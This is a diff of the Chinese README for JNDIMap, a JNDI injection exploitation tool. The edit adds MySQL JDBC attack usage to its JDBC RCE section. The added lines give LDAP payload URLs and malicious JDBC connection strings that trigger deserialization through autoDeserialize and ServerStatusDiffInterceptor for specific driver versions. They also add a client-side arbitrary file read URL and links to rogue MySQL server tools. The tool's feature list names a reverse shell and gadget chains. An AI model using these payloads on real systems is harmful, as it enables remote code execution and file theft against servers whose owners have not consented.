@@ -9,7 +9,7 @@ JNDIMap 是一个 JNDI 注入利用工具, 支持 RMI 和 LDAP 协议, 包含多
 - 原生反弹 Shell (支持 Windows)
 - 加载自定义 Class 字节码
 - Tomcat/Groovy/SnakeYaml Bypass
-- Commons/Tomcat DBCP, Druid, HikariCP JDBC RCE
+- Commons DBCP/Tomcat DBCP/Alibaba Druid/HikariCP JDBC RCE
 - NativeLibLoader 加载动态链接库
 - MLet 探测可用 Class
 - LDAP 反序列化
@@ -142,9 +142,74 @@ gcc -shared -fPIC exp.c -o exp.dylib
 
 ### JDBC RCE
 
-支持 Commons/Tomcat DBCP, Druid, HikariCP JDBC RCE
+支持以下数据库连接池的 JDBC RCE
 
-将以下 URL 中的 Factory 替换为 CommonsDBCP1, CommonsDBCP2, TomcatDBCP1, TomcatDBCP2, Druid, HikariCP 其中之一
+- Commons DBCP
+- Tomcat DBCP
+- Alibaba Druid
+- HikariCP
+
+将 URL 中的 Factory 替换为 CommonsDBCP1/CommonsDBCP2/TomcatDBCP1/TomcatDBCP2/Druid/HikariCP 其中之一
+
+#### MySQL
+
+**MySQL JDBC 反序列化**
+
+```bash
+# detectCustomCollations (5.1.19-5.1.48, 6.0.2-6.0.6)
+ldap://127.0.0.1:1389/Factory/MySQL/Deserialize1/127.0.0.1/3306/root
+
+# ServerStatusDiffInterceptor
+
+# 5.1.11-5.1.48
+ldap://127.0.0.1:1389/Factory/MySQL/Deserialize2/127.0.0.1/3306/root
+
+# 6.0.2-6.0.6
+ldap://127.0.0.1:1389/Factory/MySQL/Deserialize3/127.0.0.1/3306/root
+
+# 8.0.7-8.0.19
+ldap://127.0.0.1:1389/Factory/MySQL/Deserialize4/127.0.0.1/3306/root
+```
+
+JDBC URL (供参考)
+
+```bash
+# detectCustomCollations (5.1.19-5.1.48, 6.0.2-6.0.6)
+jdbc:mysql://127.0.0.1:3306/test?detectCustomCollations=true&autoDeserialize=true&user=123
+
+# ServerStatusDiffInterceptor
+
+# 5.1.11-5.1.48
+jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=test
+
+# 6.0.2-6.0.6
+jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=test
+
+# 8.0.7-8.0.19
+jdbc:mysql://127.0.0.1:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=test
+```
+
+**MySQL 客户端任意文件读取**
+
+```bash
+# 全版本
+ldap://127.0.0.1:1389/Factory/MySQL/FileRead/127.0.0.1/3306/root
+```
+
+JDBC URL (供参考)
+
+```bash
+# 全版本
+jdbc:mysql://127.0.0.1:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true&allowLoadLocalInfileInPath=/&maxAllowedPacket=655360
+```
+
+上述两种方式均需要搭配恶意 MySQL 服务端使用
+
+[https://github.com/4ra1n/mysql-fake-server](https://github.com/4ra1n/mysql-fake-server)
+
+[https://github.com/rmb122/rogue_mysql_server](https://github.com/rmb122/rogue_mysql_server)
+
+[https://github.com/fnmsd/MySQL_Fake_Server](https://github.com/fnmsd/MySQL_Fake_Server)
 
 #### PostgreSQL
 
@@ -239,7 +304,7 @@ Usage: java -cp JNDIMap.jar map.jndi.server.DerbyServer [-p <port>] [-g <gadget>
 
 即 LDAP 反序列化, 不支持 RMI 协议
 
-JNDIMap 内置 CommonsCollections K1-K4 和 CommonsBeanutils1NoCC 利用链, 同时也支持自定义数据反序列化
+JNDIMap 内置 CommonsCollections K1-K4 和 CommonsBeanutils 利用链 (1.8.3 + 1.9.4), 同时也支持自定义数据反序列化
 
 ```bash
 # 自定义数据反序列化
